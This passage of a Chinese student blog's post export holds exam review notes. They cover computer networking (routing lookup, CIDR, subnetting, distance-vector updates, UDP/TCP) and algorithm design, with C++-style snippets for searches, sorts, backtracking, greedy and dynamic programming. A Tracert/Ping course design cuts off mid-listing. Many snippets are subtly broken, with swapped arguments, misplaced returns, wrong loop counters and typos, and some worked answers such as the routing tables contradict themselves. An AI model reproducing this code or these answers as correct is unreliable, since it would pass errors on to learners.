先判断是否直接交付.对路由器直接相连的网络逐个进行检查;用各网络的子网掩码和D逐位相与,看结果是否和相应的网络地址匹配.若匹配,则把分组直接交付,转发任务结束,否则就是间接交付,执行下一步 若路由表中有目的地址为D的特定主机路由,则把数据报传送给路由表中所指明的下一跳路由,否则执行下一步 对路由表中的每一行(目的网络地址,子网掩码,下一跳地址),用其中的子网掩码和D逐位相与,其结果为N.若N与某行的网络地址匹配,则把数据报传送给某行指明的下一跳路由器,否则执行下一步 路由表中有一个默认路由,则把数据报传送给路由表中所指明的默认路由,否则执行下一步 报告转发分组出错 第二种:使用CIDR 使用CIDR时互联网的IP层查找算法和上面的算法并没有什么不同.当应注意的是,在使用CIDR时,我们使用地址掩码.它的前一部分是一连串的1,对应CIDR中的网络前缀.而掩码中的后一部分是一连串的0,对应于CIDR中的网络后缀.路由表中由”网络前缀”和”下一跳地址”组成.但是在查找路由表时可能会得到不止一个匹配结果,这时应当从匹配结果中选择具有最长网络前缀的路由.如果在路由表中的各项是按网络前缀的长度排序的,把最长的网络前缀放在最前面,那么当查找路由表找到匹配时,就是找到了正确的路由,因而结束了查找. 7.如下的4个/24地址块,试进行最大可能性的聚合 212.56.132.0/24 212.56.133.0/24 212.56.134.0/24 212.56.135.0/24 这几个地址前面2个字节都一样,因此只需要比较第三个字节 212=(11010100)2,56=(00111000)2 132=(10000100)2,133=(10000101)2,134=(10000110)2,135=(10000111)2 所以共同前缀有22位,即11010100.00111000.100001,聚合的CIDR地址块是:212.56.132.0/22 8.已知地址块中的一个地址是190.87.140.202/29.试求这个地址块中的最小地址和最大地址.地址掩码是什么?地址块中共有多少个地址?相当于多少C类地址? 给定地址的前缀是29位,因此我们只需要观察第四个字节,只把第四个字节写成二进制即可 190.87.140.(1100 1010)/29,取前29位，后面全是0，即得出最小地址。取前29位，后面全是1，即得出最大地址。地址数是8个，相当于1/32个C类地址 论述题 1.某单位分配到一个起始地址为14.24.74.0/24的地址块。该单位需要用到三个子网，它们的三个子地址块的具体要求是：子网N1需要120个地址，N2需要60个地址，N3需要10个地址。请给出地址块的分配方案 这个地址的网络前缀是24位，因此主机号有8位，即一共有256个地址。可以拿总地址的一半128个分配给子网N1。这个地址块的网络前缀是25位。再将剩下的一半64个分配给子网N2，这个地址块的网络前缀是26位。还剩下64个地址，可以拿出1/4分配给子网N3，这个地址块的网络前缀是28位。最后剩下的48位留下以后用。 这样，分配给子网N1的首地址是14.24.74.0/25，末地址是14.24.74.127/25 分配给子网N2的首地址是14.24.74.128/26，末地址是14.24.74.191/26 分配给子网N3的首地址是14.24.74.192/28，末地址是14.24.74.207/28 解释一下：当第四个字节，从左到右为0 000 0000时，说明已经把0后的所有地址都给了出去，余下的地址有1 000 0000到 1 111 1110.而再给64个，那就从10后面的 00 0000开始给，然后剩下只有11 后面的00 0000可以用。再给16个，那就是 1100后面的 0000可以用。其实1101 开头，1110开头，1111开头都可以。 2. 先把收到路由中的距离+1 地址 距离 N1 3 N2 2 N3 4 N4 8 路由器A更新后的路由表如下： 地址 距离 路由 改变信息 N1 3 C 不同的下一跳，距离更短，改变 N2 2 C 不同的下一跳，距离一样，不变 N3 1 F 不同的下一跳，距离更大，不改变 N4 5 G 不同的下一跳，距离更大，不改变 3. 此题同上题差不多，咱们直接就开干！ 收到的路由： 地址 距离 N2 5 N3 9 N6 5 N8 4 N9 6 路由器B更新后的路由表如下： 地址 距离 路由 改变信息 N1 7 A 无新信息，不改变 N2 5 C 相同的下一跳，更新 N3 9 C 新的项目，添加进来 N6 5 C 不同的下一跳，距离更短，更新 N8 4 E 不同的下一跳，距离相同，不变 N9 4 F 不同的下一跳。距离更大，不改变 传输层简答题 1.为什么说UDP是面向报文的，而TCP是面向字节流的呢？ 发送方UDP对应用程序交下来的报文 ，在添加首部后就向下交付IP层，UDP对应用层交下来的报文，既不合并，也不拆分，而是保留这些报文的边界，即一次发送一个报文。接收方UDP对IP层交上来的UDP用户数据报，在去除首部后就原封不动的交付上层的应用进程，即一次交付一个完整报文。 发送方TCP对应用程序交下来的报文数据块，视为无结构的字节流，但维持各字节。 2.某个应用进程使用运输层的用户数据报UDP，然而继续向下交给IP层后，又封装成IP数据报。既然都是数据报，可否跳过UDP而直接交给IP层？哪些功能UDP提供了但IP没有提供？ 不可跳过UDP直接交给IP层，因为以下几点： IP数据报只能找到目的主机而无法找到目的进程。如果应用进程直接把数据交给下面的IP层，那么在传送到对方IP层后，就只能交付目的主机，但不知道交付哪一个应用进程 UDP提供对应用进程的复用和分用功能，以及提供对数据差分的差错检测。这些功能IP层没有提供。 3.一个应用程序用UDP，到了IP层把数据报再划分为4个数据片并发送出去。结果前两个数据报丢失，后两个到达目的站。过了一段时间应用程序重传UDP，而IP层仍然划分为4个数据报来传送。结果这次前两个到达目的站而后两个丢失，试问：在目的站能否将这两次传输的4个数据片段组装成为完整的数据报？假定目的站第一次收到的后两个数据报片仍然保存在目的站缓存中。 不行，因为重传IP数据报的标识字段有另外一个标识符。标识符相同的IP数据报段才能组装成一个IP数据报。前两个IP数据报片的标识符不同，所以不能组成一个IP数据报。","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"期末复习","slug":"期末复习","permalink":"http://1905060202.github.io/tags/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/"},{"name":"计算机网络","slug":"计算机网络","permalink":"http://1905060202.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}]},{"title":"计算机算法设计与分析复习","date":"2022-01-04T01:10:50.000Z","path":"2022/01/04/计算机算法设计与分析复习/","text":"写在前面由于本课程是第一次面向本科专业开设，我身为第一届应考生，承担的考试压力要大许多。一是因为没有历年的真题供参考，另一方面是自己也并没有把太多心思放在这门课程的学习上。好在老师给出了复习提纲和样卷。那么我们就按照复习提纲和样卷来做一个全面的复习。 2021考题预测1.插入算法 2.Master定理 3.DFS/BFS 4.回溯方法解决子集树/排列树的搜索问题 5.分支界限方法解决旅行商问题(较难暂时放弃) 6.Las解决0/1背包问题 7.动态规划方法解决多段图问题 8.贪心算法求解装载问题 9.归并排序/快速排序/二分排序 10.回溯方法解决最大团问题/子集和问题 2021期末预测题目全解必须背下来的算法： DFS123456789101112void DFS(Matrix&lt;bool&gt; &amp;G,int v,vector&lt;bool&gt; visited,Func Visit)&#123; int n = G.Rows();//求出顶点数 Visit(v);//访问根 Visited(v)=1;//已访问 for(int w =0;w&lt;n;++w)&#123; if(not Visited[w] and G(v,w))&#123; DFS(G,w,Visited,Visit); &#125; &#125; &#125; BFS1234567891011121314151617181920void BFS(Matrix &lt;bool&gt; &amp;G,int v,vector&lt;bool&gt; Visited,Func Visit)&#123; int n = G.Rows(); queue &lt;int&gt; Q; //根节点 Visit(v); Visited[v]=1; Q.push(v); while(not empty(Q))&#123; v = Q.front(); Q.pop(); for(int w=0;w&lt;n;++w)&#123; if(not Visited[w] and G(v,w)==1)&#123; Visit(w); Visited[w]=1; push(w); &#125; &#125; &#125;&#125; 回溯方法解决子集树搜索问题123456789101112131415161718#include &lt;dummy.h&gt;void B_SubSet(int n)&#123; vector&lt;int&gt; X(n);//解向量 function &lt;void(int)&gt; SubSet = [&amp;](int)&#123; if(t&gt;=n) Print X; else&#123; if(legal(t))&#123; X[t]=1; SubSet(t+1); &#125; if(bound(t))&#123; X[t]=0; SubSet(t+1); &#125; &#125; &#125;&#125; 回溯方法解决排列数搜索问题1234567891011121314151617#include &lt;dummy.h&gt;void B_Perm(int n)&#123; vector &lt;int&gt; X(n); iota(X);//解向量需要初始化为自然排列 function&lt;void(int)&gt;Perm=[&amp;](int t)&#123; if(t&gt;=n-1) cout&lt;&lt;X&lt;&lt;endl; else&#123; for(int i =t;i&lt;n;++i)&#123; swap(X[t],X[i]); if(legal(t) and bound(t)) Perm(t+1); swap(X[t],X[i]); &#125; &#125; &#125;&#125; Las解决0/1背包问题123456789101112131415#include &lt;LasVegas.h&gt;bool Knap(vector&lt;double&gt; &amp;V,vector&lt;double&gt; &amp;W,double c,double t,vector&lt;bool&gt; &amp;X)&#123; //参数说明：效益数组V。重量数组W 背包容量c static mt19937g; int n = min(size(V),size(W)); double fv = 0,fw = 0; for(int i =0;i&lt;n;++i)&#123; X[i]=g()%2; fv+=V[i]*X[i]; fw+=W[i]*X[i]; if(fw&gt;c) return false; &#125; return fv&gt;=t;&#125; 贪心算法求解装载问题1234567891011auto Load(vector&lt;double&gt; &amp;W,double M)&#123; int n =size(W); sort(W); vector&lt;bool&gt;X(n,0); double rc = M; for(int i=0;i&lt;n and W[i]&lt;=rc;++i)&#123; X[i] = 1; rc- = W[i]; return X; &#125;&#125; 回溯方法解决最大团问题1234567891011121314151617Clique(t,cn)//用 cn 记录当前团顶点数&#123; if(t&gt;=n and cn &gt;fn)&#123; // 答案 ( 更优 ) fn = cn; BX = X; &#125;else if(t&lt;n)&#123; if(Connected(G,X,t))// 可行 ( 当前成团 ) &#123; X[t]=1; Clique(t+1,cn+1); &#125; if(cn+n-t&gt;fn)&#123;// 界限 ( 可能有更大的团 ) X[t]=0; Clique(t+1,cn); &#125; &#125;&#125; 回溯方法解决子集和问题1234567891011121314151617SetSum(t,s,r)&#123; if(not Y.empty()) return; // 已经记录答案 , 不再继续寻找 // 已经找到答案 if(s==M)// s 为已选整数的和 ( 和 ), r 为待处理的所有整数的和 ( 余额 ) print X; else if(t&lt;n)&#123; if(s+W[t]&lt;=M)&#123; // 可行 , t+1 号数 , 和增加 , 余额减少 X[t]=1; SetSum(t+1,s+W[t],r-W[t+1]); &#125; if(s+r-W[t]&gt;=M)&#123;// 界限 , t+1 号数 , 和不变 , 余额减少 X[t] = 0; SetSum(t+1,s,r-w[t+1]); &#125; &#125;&#125; 归并排序1234567891011121314151617181920212223242526272829303132333435#include &lt;algorithm.h&gt;template&lt;class T&gt;//合并两个有序组void Merge(T X[],int low,int m,int up)&#123; T W[up-low];//一个缓冲区 int i = low,j = m,k=0;//左指针，右指针，结果游标k for(;i&lt;m and j&lt;up;k++) &#123; if(X[i]&lt;X[j]) &#123; W[k] = X[i]; i++; &#125;else &#123; W[k] = X[j]; j++; &#125; &#125; for(;i&lt;m;i++)&#123;//剩余的左侧 W[k] = X[i]; k++; &#125; for(;j&lt;up;j++)&#123;//剩余的右侧 W[k] = X[j]; j++; &#125; void MergeSort(T X[],int low,int up)&#123;//归并排序 if(up-low&lt;=1) return; int m =(low+up)/2;//计算分割点 MergeSort(X,low,m);//左排序 Mergesort(X,m,up);//右排序 Merge(X,low,m,up);//合并&#125; 快速排序12345678910111213141516171819202122232425262728#include &lt;algorithm.h&gt;//以一个数为基准,将序列中的其他数往它两边“扔“，即是分治思想//首先要写一个划分程序//非常漂亮的算法，省去了左右指针template&lt;class T&gt; // 划分 , 待划分区间为 [low, up), 左侧存放小元素int Partition(T X[], int low, int up)&#123; //我们从尾部开始划分,不用移动元素 int key = up-1; int m = low;//划分位置 for(int i =low;i&lt;up;i++)&#123; if(X[i]&lt;X[key])&#123;//小元素调整到左侧 swap(X[i],X[m]); m++;//左侧元素增加，划分位置后移 &#125; &#125; swap(X[key],X[m]);//将划分元素调整到划分位置 return m;//返回划分位置&#125;void QuickSort(T X[],int low,int up)&#123;//快排主程序 if(up-low&lt;=1) return; //要标志划分位置m int m =Partition(X,low,up); QuickSort(X,low,m);//左排序 QuickSort(X,m+1,up);//右排序&#125; 二分搜索12345678910111213141516171819#include &lt;algorithm.h&gt;template&lt;class T1,class T2&gt;int search(T x[],int n,const T2 &amp;v)&#123; //分治之思想，把元素丢到两边然后重复 int low = 0; int up = n; while(low &lt; up)&#123; int m =(low+up)/2; if(X[v]&lt;X[m])&#123; up = m; &#125; if(X[v]&gt;X[m]) low = m+1； if(X[v]==X[m]) return m; &#125; return -1;&#125; 插入算法123456789101112template &lt;class T,class T2&gt;int insert(T X[],int m,const T2 &amp;V)&#123; int p; for(p = m-1;p&gt;0 and X[p]&gt;v;--p) if(X[p]==v) return m; for(int i=m-1;i&gt;=p;--i)&#123; X[i+1]=X[i]; X[p+1] = v; return m+1; &#125;&#125; 图的遍历二叉树的遍历二叉树的C++表示1234567#include &lt;algorithm.h&gt;template&lt;class T&gt;struct BtNode//二叉树结点&#123; T data; BtNode *left = 0,*right = 0;//左子树，右子树&#125;; 二叉树的先根次序遍历123456789template&lt;class T,class Func&gt;//先根遍历void PreOrder(BtNode&lt;T&gt; *x ,Func Visit)&#123; if(x==0) return; Visit(x)//访问根 PreOrder(x-&gt;left,Visit);//遍历左子树 PreOrder(x-&gt;right,Visit);//遍历右子树&#125; 中根遍历与后根遍历只是调换了顺序，故不再赘述。 二叉树的按层次遍历12345678910111213141516171819202122232425template&lt;class T,class Func&gt;void LevelOrder(BtNode&lt;T&gt; *x,Func Visit)&#123; queue&lt;BtNode&lt;T&gt; *&gt; Q; if(x!=0)&#123; Visit(x); Q.push(x);//访问根并将根加入队列 &#125; while(not empty(Q))&#123; x = Q.front(); Q.pop(); //访问x的左右儿子并将左右儿子加入队列 auto left = x-&gt;left; auto right = x-&gt;right; if(left!=0) &#123; Visit(left) Q.push(left); &#125; if(right!=0）&#123; Visit(right) Q.push(right); &#125; &#125;&#125; 一般树的遍历树的C++表示123456#include &lt;algorithm.h&gt;template&lt;class T&gt;//树节点类struct TreeNode&#123; T data; TreeNode *first = 0,next = 0;//第一棵子树，下一棵树(兄弟)&#125; 树的先根遍历12345678910template&lt;class T,class Func&gt;void PreOrder(TreeNode&lt;T&gt; *x,Func Visit)&#123; if(x==0) return; Visit(x);//访问根 PreOrder(x-&gt;first,Visit);//遍历第一棵子树 for(x=x-&gt;first;x!=0;x=x-&gt;next)&#123; PreOrder(x-&gt;next,Visit);//遍历其余子树 &#125;&#125; 树的中根遍历只是与先根遍历的顺序不同，不再赘述。 树的后根遍历1234567891011template&lt;class T,class Func&gt;void PostOrder(TreeNode&lt;T&gt; *x,Func Visit)&#123; if(x==0) return; auto t = x-&gt;first; PostOrder(t,Visit); for(;t!=0;t=t-&gt;next)&#123; PostOrder(t&gt;next,Visit); Visit(x); &#125;&#125; 树的按层次遍历1234567891011121314151617template&lt;class T,class Func&gt;void LevelOrder(TreeNode&lt;T&gt; *x,Func Visit)&#123; queue&lt;TreeNode&lt;T&gt; *&gt; Q; if(x!=0)&#123; Visit(x); Q.push(x);//访问根并将根加入队列 &#125; while(not empty(Q))&#123; x = Q.front(); Q.pop(); //访问x的所有儿子并将所有儿子加入队列 for(x=x-&gt;first;x!=0;x=x-&gt;next)&#123; Visit(x); Q.push(x); &#125; &#125;&#125; 连通图的两种遍历方法宽度优先搜索BFS12345678910111213141516171819202122#include &lt;algorithm.h&gt;template&lt;class Fun&gt;void BFS(Matrix&lt;bool&gt; &amp;G,int v,vector&lt;bool&gt; &amp;Visited,Fun Visit)&#123; //参数：邻接矩阵，开始顶点，访问标记(已经初始化为0），访问函数 int n =G.Rows();//获取矩阵的行数,即顶点数 queue&lt;int&gt; Q;//创建空队列 Visit(v); Visited[v] = 1; Q.push(v);//访问v并加入队列 while(not empty(Q))&#123; v = Q.front(); Q.pop();//取出队首元素v for(int w=0;w&lt;n;++w)&#123;//遍历所有顶点，康康有无有与自己相连的边 if(not Visited[w] and G(v,w)==1)&#123; //w与v相邻且未访问 Visit(w); Visited[w]=1; Q.push(w);//访问w，入队 &#125; &#125; &#125;&#125; 深度优先搜索DFS1234567891011121314#include &lt;algorithm.h&gt;template&lt;class Fun&gt;//搜索一个连通分支void DFS(Matrix&lt;bool&gt; &amp;G,int v,vector&lt;bool&gt; &amp;Visited,Fun Visit)&#123; //参数：邻接矩阵，开始顶点，访问标记，访问函数 int n =G.Rows(); Visit(v); Visited[v]=1; for(int w =0;w&lt;n;++w)&#123; if(not Visited[w] and G(v,w)==1)&#123; //w与v相邻且未访问 DFS(G，w，Visited，Visit);//访问w &#125; &#125;&#125; 分治方法折半搜索1234567891011121314151617#include &lt;algorithm.h&gt;template&lt;class T1,class T2&gt;int search(T x[],int n,const T2 &amp;v)&#123; //在升序数组X中搜索v所在的位置 int low = 0; int up = n; while(low&lt;up)&#123; int m = (low+up)/2; if(v==X[m]) reuturn m; else if(v&lt;X[m]) up=m;//左侧继续搜索 else low = m+1;//右侧继续搜索 &#125; return -1;//-1表示未找到v&#125; 归并排序123456789101112131415161718192021222324252627282930313233343536#include &lt;algorithm.h&gt;template&lt;class T&gt;//合并两个有序组void Merge(T X[],int low,int m,int up)&#123; T W[up-low];//缓冲区 int i=low ,j=m,k=0;//左侧游标i，右侧游标j，结果游标k； for(;i&lt;m and j&lt;up;++k)&#123;//当两侧都未取尽时 if(X[i]&lt;X[j])//左侧元素较小 &#123; W[k] = X[i]; ++i; &#125;else&#123;//右侧元素较小 W[k]=X[j]; ++j; &#125; for(;i&lt;m;++k)&#123;//左侧剩余部分添加到W W[k]=X[i]; ++i; &#125; for(;j&lt;up;++k)&#123;//右侧剩余部分添加到W W[k]=X[j]; ++j; &#125; &#125;&#125;//这个算法是有错的，请自行鉴别void MergeSort(T X[],int low,int up)&#123; if(up-low&lt;=1) return;//最多一个元素 int m = (low+up)/2;//分割点 MergeSort(X,low,m);//左侧排序 MergeSort(X,m,up);//右侧排序 Merge(X,low,m,up);//合并&#125; 快速排序123456789101112131415161718192021#pragma once#include &lt;algorithm.h&gt;template&lt;class T&gt; // 划分 , 待划分区间为 [low, up), 左侧存放小元素int Partition(T X[], int low, int up)&#123; int key = up - 1, m = low; // 划分元素选用尾部元素 , 用 m 记录划分位置 for(int i = low; i &lt; key; ++i) // 小元素调整到左侧 ( 划分元素不参与比较 ) if(X[i] &lt; X[key]) swap(X[i], X[m]), ++m; // 左侧元素增加 , 划分位置后移 swap(X[key], X[m]); // 将划分元素调整到划分位置 return m; // 返回划分位置&#125; /void QuickSort(T X[],int low,int up)&#123; if(low&gt;=up) return;//没有元素 int m =Partition(X,up,low);//划分位置 QuickSort(X,low,m);//左侧排序 QuickSort(X,m+1,up);//右侧排序&#125; 贪心方法装载问题1234567891011121314#include &lt;algorithm.h&gt;auto Load(vector&lt;double&gt; &amp;W,double M)&#123; //参数：重量数组，货船容量 int n = size(W);//货箱个数 sort(W);//重量数组W升序排列 vector&lt;bool&gt; X(n,0);//解向量初始化为0 double rc = M;//背包剩余容量 for(int i=0;i&lt;n and W[i]&lt;=rc;++i)&#123; X[i] = 1; rc- = W[i]; //装入货箱i &#125; return X;&#125; 背包问题12345678910111213141516auto Knap(vector&lt;double&gt; &amp;V,vector&lt;double&gt; &amp;W,double M)&#123; //参数：价值数组，重量数组，背包容量 int n = min(size(V),size(W));//物品数 Sort(V,W);//将物品按单价降序排列； vector&lt;double&gt; X(n,0);//解向量初始化为零 double rc = M;//背包剩余容量 int t;//当前物品 for(t = 0;t&lt;n and W[t]&lt;=rc;++t)&#123; X[t] = 1; rc - =W[t];//可完整装包的物品完整装包 &#125; if(t&lt;n)&#123; X[t]=rc/W[t];//不能完整装包的物品部分装包 return X; &#125;&#125; 活动安排问题1234567891011121314151617#include &lt;algorithm.h&gt;auto Action(vector&lt;double&gt; &amp;S,vector&lt;double&gt; &amp;F)&#123; //参数：开始时间数组，结束时间数组 int n = min(size(S),sieze(F)); Sort(S,F);//将活动按照结束时间升序排列 vector&lt;bool&gt; X(n,0);//解向量初始化为零 X[0] = 1;//将活动0加入解中 for(int i =1,j=0;i&lt;n;++i)&#123; if(S[i]&gt;=F[j])&#123; X[i] = 1; j = i;//将活动i加入解中 &#125; &#125; return X;&#125; 最小生成树问题12345678910111213141516171819202122232425bool Prim(const Matrix&lt;double&gt; &amp;G,int v,vector&lt;int&gt; &amp;prev)&#123; int n = G.Rows();//G是加权图，顶点数为n prev.assign(n,v);//prev用于保存各顶点的父亲，初始根为v vector&lt;bool&gt; S(n,false);//S标志顶点是否已选，初始为0 S[v] = true;//选取v for(int i =0;i&lt;n-1;++i)&#123; //寻找已选项点到未选项点权值最小的顶点 double min = inf;//min初始为无穷大 for(int w=0;w&lt;n;++w)&#123; if(not S[w] and G(prev[w],w)&lt;min) &#123; min = G(prev[w],w); v=w; &#125; &#125; if(isinf(min)) return false;//不连通 S[v] = true;//选取v for(int w = 0;w&lt;n;++w)&#123;//更新未选顶点父亲 if(not S[w] and G(v,w)&lt;G(prev[w],w)) prev[w] = v; &#125; &#125; return true;//连通&#125; 动态规划方法矩阵连乘问题的动态规划方法12345678910111213141516171819auto MatrixChain(int r[],int n)&#123; //动态规划方法 Matrix&lt;int&gt; c(n,n,0);//c(i,j)初始为0 Matrix&lt;int&gt; kay(n,n);//用于构造最优次序 for(int i =n-2;i&gt;=0;--i)&#123; //计算c(i,j)和kay(i,j).其中j&gt;i for(int j = i+1;j&lt;n;++j)&#123; //从k = i开始计算最小项，并更新kay c(i,j) = (int)inf; for(int k =i;k&lt;j;++k)&#123; int t = c(i,k)+c(k+1,j)+r[i]*r[k+1]*r[j+1]; if(t&lt;c(i,j))&#123; c(i,j) = t; kay(i,j) = k;//找到更小项 &#125; &#125; &#125; &#125;&#125; 多段图问题1234567891011121314151617181920212223auto MultiGraph(Matrix&lt;double&gt; &amp;G)&#123; //邻接矩阵G，顶点按段序统一编号 int n = G.Rows(); t = n-1;//顶点数，汇点 vector&lt;double&gt; C(n,0);//C[j]是j到汇点的最小成本，初始为0 vector&lt;int&gt; Next(n);//Next[j]是j到汇点的最短路径中j的后继顶点 for(int j =t-1;j&gt;=0;--j)&#123; //从j的后一个阶段中选择顶点r，使G(j,r)+C[r]最小 int r = j+1; for(int i =r;i&lt;n;++i)&#123; if(G(i,j)+C[i]&lt;G(j,r)+C[r]) r = i; C[j] = G(j,r)+C[r]; Next[j] = r; &#125; &#125; vector&lt;int&gt; X(m);//X[i]是最短路径中第i阶段选取的顶点 X[0] = 0; for(int i = 0;i&lt;m-1;++i)&#123; X[i+1] = Next[X[i]]; &#125; return X;&#125; 回溯方法子集和问题1234567891011121314SetSum(t,s,r)&#123; if(s==M) print X; else if(t&lt;n)&#123; if(s+W[t]&lt;=M)&#123; X[t] = 1; SetSum(t+1,s+W[t],r-W[t+1]); &#125; if(s+r&gt;=M)&#123; X[t] = 0; SetSum(t+1,s,r-W[t+1]); &#125; &#125;&#125; 旅行商问题1234567891011121314151617181920212223#include &lt;algorithm.h&gt;auto TSP(Matrix&lt;double&gt;&amp;G)&#123; int n = G.Rows();//顶点个数 vector&lt;int&gt; X(n),BX;//到当前结点的路经，最优路径 iota(X);//解向量X需初始化为自然排列 double BC = inf;//最优耗费 function&lt;void(int,double)&gt; TSP=[&amp;](int t,double C)&#123; auto LC = C+G(X[t-1],X[t])+G(X[t],0);//当前回路耗费 if(t&gt;=n-1 and LC&lt;BC)&#123; BC = LC; BX = X;//答案，更优 &#125;else if(t&lt;n-1)&#123; for(int i = t;i&lt;n;++i)&#123; swap(X[t],X[i]); auto CC = C +G(X[t-1],X[t]);//当前路经耗费 if(CC&lt;BC)&#123; TSP(t+1,CC);//可行(当前路径可能更优) &#125; swap(X[t],X[i]); &#125; &#125; &#125;&#125; 最大团问题1234567891011121314151617function Clique(t,cn)&#123; if(t&gt;=n and cn&gt;fn) &#123; fn = cn; BX = X; &#125;else if(t&lt;n)&#123; if(Connected(G,X,t))&#123; X[t] = 1; Clique(t+1,cn+1); &#125; if(cn+n-t&gt;fn)&#123; X[t]=0; Clique(t+1,cn); &#125; &#125;&#125; 概率方法0/1背包问题12345678910111213141516#include &lt;LasVegas.h&gt;bool Knap(vector&lt;double&gt; &amp;V,vector&lt;double&gt; &amp;W,double c,double t,vector&lt;bool&gt; &amp;X)&#123; //参数：效益数组V 重量数组W 背包容量c static mt19937g;//随机数产生器 int n =min(size(V),size(W)); double fv = 0;//最后效益 double fw = 0;//最后重量 for(int i = 0;i&lt;n;++i)&#123;//随即决定物品i的选取 X[i] = g()%2; fv+=V[i]*X[i]; fw+=W[i]*X[i]; if(fw&gt;c) return false; &#125; return fv&gt;=t;&#125;","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://1905060202.github.io/tags/%E7%AE%97%E6%B3%95/"},{"name":"期末复习","slug":"期末复习","permalink":"http://1905060202.github.io/tags/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/"}]},{"title":"简析中国社会年轻人心理","date":"2021-12-30T01:25:51.000Z","path":"2021/12/30/简析中国社会年轻人心理/","text":"写在前面这是一篇长期更新的博文，随着博主年龄和阅历的增长，它的内容只会越来越丰富，客观。 东北县城","comments":true,"categories":[{"name":"编程随想","slug":"编程随想","permalink":"http://1905060202.github.io/categories/%E7%BC%96%E7%A8%8B%E9%9A%8F%E6%83%B3/"}],"tags":[{"name":"数据分析","slug":"数据分析","permalink":"http://1905060202.github.io/tags/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"},{"name":"社会现象","slug":"社会现象","permalink":"http://1905060202.github.io/tags/%E7%A4%BE%E4%BC%9A%E7%8E%B0%E8%B1%A1/"}]},{"title":"计算机网络课程设计之Tracert与Ping程序设计与实现","date":"2021-12-28T08:42:14.000Z","path":"2021/12/28/计算机网络课程设计之Tracert与Ping程序设计与实现/","text":"计算机网络课程设计之Tracert与Ping程序设计与实现今天是课程设计的第二天，下午16:49，我在逸夫楼328写第三个实验。 设计题目Tracert与Ping程序设计与实现 设计内容设计一个Tracert与Ping程序。 设计步骤原理分析Tracert 程序关键是对 IP 头部生存时间(time to live)TTL 字段的使用,程序实现时是向目地主机发送一个 ICMP 回显请求消息，初始时 TTL 等于 1，这样当该数据报抵达途中的第一个路由器时，TTL 的值就被减为 0，导致发生超时错误，因此该路由生成一份 ICMP 超时差错报文返回给源主机。随后，主机将数据报的 TTL 值递增 1，以便 IP 报能传送到下一个路由器，并由下一个路由器生成 ICMP 超时差错报文返回给源主机。不断重复这个过程，直到数据报达到最终的目地主机，此时目地主机将返回 ICMP 回显应答消息。这样，源主机只需对返回的每一份 ICMP 报文进行解析处理，就可以掌握数据报从源主机到达目地主机途中所经过的路由信息。 思路步骤（1）加载套接字，创建套接字库；使用Socket的程序在使用Socket之前必须调用WSAStartup函数，以后应用程序就可以调用所请求的Socket库中的其他Socket函数了。 （2）用inet_addr()将输入的点分十进制的IP地址转换为无符号长整型数，转换不成功时，按域名解析得到IP地址； gethostbyname()是查找主机名最基本的函数，如果调用成功，就返回一个指向hosten结构的指针，该结构中含有对应于给定主机名的主机名字和地址信息，用来承接域名解析的结构。 （3）设置发送接收超时时间，即请求超时，设置接收、发送超时的套接字； （4）构造ICMP回显请求消息，并以TTL递增顺序发送报文，填充ICMP报文中每次发送时不变的字段，构造ICMP头； （5）设置IP报头的TTL字段，填充ICMP报文中每次发送变化的字段，记录序列号和当前时间； （6）指定对方信息，发送TCP回显请求信息；sendto()函数利用数据表的方式进行数据传输，指定哪个socket发送给对方 （7）接收ICMP差错报文并进行解析：如果有数据到达，解析数据包，如果到达目的地址，输出IP地址；如果没有数据到达，输出接收超时，递增TTL值，TTL增为最大时，若还没有到达目的地址，退出循环，输出目的地址不在线； recvform()利用数据报方式进行数据传输，当recvfrom()返回时，(sockaddr*)&amp;from包含实际存入from中的数据字节数。Recvfrom函数返回接收到的字节数或当出现错误时返回－1，并置相应的errno。 （8）重复（2）-（7），实现查找一个范围内的IP地址。 流程图 关键代码寻找下一个IP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152char * findNextIp(char * nowIp)&#123; char nextIpAddress[ipAddressSize]; char z[4][4]; int idxIp = 0, idxj = 0; for (int i = 0; i &lt; strlen(nowIp); i++) &#123; if (nowIp[i] == &#x27;.&#x27;) &#123; z[idxIp][idxj] = &#x27;\\0&#x27;; idxIp++; idxj = 0; continue; &#125; z[idxIp][idxj++] = nowIp[i]; &#125; z[idxIp][idxj] = &#x27;\\0&#x27;; for (int i = 3; i &gt;= 0; i--) &#123; if (strcmp(&quot;254&quot;, z[i]) == 0) &#123; strcpy(z[i], &quot;1&quot;); // 这里让ip 1-254 &#125; else &#123; int x; x = atoi(z[i]) + 1; itoa(x,z[i],10); // 第三个参数是 int的进制 break; &#125; &#125; char retIp[ipAddressSize]; strcpy(retIp, z[0]); char c[2] = &quot;.&quot;; for (int i = 1; i &lt; 4; i++) &#123; strcat(retIp, c); strcat(retIp, z[i]); &#125; /*cout &lt;&lt; retIp &lt;&lt; endl;*/ return retIp;&#125; 四、调试过程​ 五、设计结果及结果分析 完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350#include &lt;iostream&gt;#include &lt;winsock2.h&gt;#include &lt;ws2tcpip.h&gt;#include &lt;stdlib.h&gt;#include &lt;sstream&gt;using namespace std;#pragma comment(lib, &quot;Ws2_32.lib&quot;)const int ipAddressSize = 14;//int count11=0;//IP 报头typedef struct&#123; unsigned char hdr_len : 4; //4 位头部长度 unsigned char version : 4; //4 位版本号 unsigned char tos; //8 位服务类型 unsigned short total_len; 